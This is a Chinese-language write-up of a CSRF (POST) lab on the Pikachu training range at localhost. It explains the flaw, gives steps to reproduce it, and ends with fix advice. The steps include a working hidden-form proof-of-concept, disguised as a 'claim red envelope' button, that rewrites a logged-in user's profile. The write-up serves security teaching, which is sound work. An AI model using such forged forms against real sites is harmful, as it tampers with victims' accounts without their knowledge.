---
title: Pikachu CSRF(POST) Writeup
date: 2026-10-25
category: Web安全
tags: [Pikachu, CSRF, 跨站请求伪造, POST]
---
## 一、漏洞简介
CSRF（跨站请求伪造 Cross-Site Request Forgery）：服务端仅依靠 Cookie 进行身份鉴权，没有增加 CSRF Token 校验。攻击者构造恶意页面，诱骗**已经登录站点**的用户访问；用户浏览器会自动携带站点的 Cookie 发起请求，在用户不知情的情况下执行指定操作，本实验为篡改用户资料。

> ⚠️ 声明：本实验仅在本地靶场 127.0.0.1 学习测试，严禁对公网网站实施同类攻击。

## 二、实验环境
- 靶场：Pikachu
- 靶场地址：`http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post.php`
- 环境：phpstudy + Chrome/Edge
- 工具：Burp Suite Community

## 三、复现步骤
1. 使用账号 `lucy` 登录，进入资料修改页面，**保持该标签登录状态不关闭**。
2. 开启 Burp 代理，提交修改资料，抓取 POST 数据包。观察包内容：只有 `sex、phonenum、add、email、submit` 参数，**不存在 CSRF Token**，仅依靠 `PHPSESSID` Cookie 鉴权，存在 CSRF(POST) 漏洞。
3. 构造恶意表单页面：修改 phpstudy WWW 目录下 `index.html`，写入 POC：
html
<form action="http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="post">
    <input type="hidden" name="sex" value="hacker">
    <input type="hidden" name="phonenum" value="999999">
    <input type="hidden" name="add" value="stolen">
    <input type="hidden" name="email" value="hack@test.com">
    <input type="submit" value="点击领取红包">
</form>
4. 新开浏览器标签访问 http://127.0.0.1，页面出现【点击领取红包】按钮。

5. 保持 lucy 的皮卡丘登录页面不关闭，点击恶意页面按钮提交请求。

6. 切回 lucy 会员页面刷新，用户资料被篡改，攻击成功。
补充：新版浏览器存在 SameSite Cookie 策略，部分环境会拦截 Cookie，导致页面 POC 无法生效；可以使用 Burp Repeater 带上合法 Cookie 重放数据包验证风险。
## 四、漏洞原理

修改资料接口只校验会话 Cookie，没有一次性随机 Token 校验。只要浏览器持有用户有效 Cookie，无论请求来自站内表单还是外部恶意页面，服务器都会执行修改逻辑。攻击者不需要拿到账号密码，只需要诱骗处于登录状态的用户访问恶意页面。

## 五、修复建议

1. 添加 CSRF Token：后端每次加载表单时生成一次性随机 Token 并存入 Session，提交时校验 Token，不匹配则拒绝请求。

2. 校验请求头 Referer，限制只接受本站域名发起的请求。

3. 设置 Cookie 属性 SameSite=Strict，阻止跨站场景自动携带 Cookie。
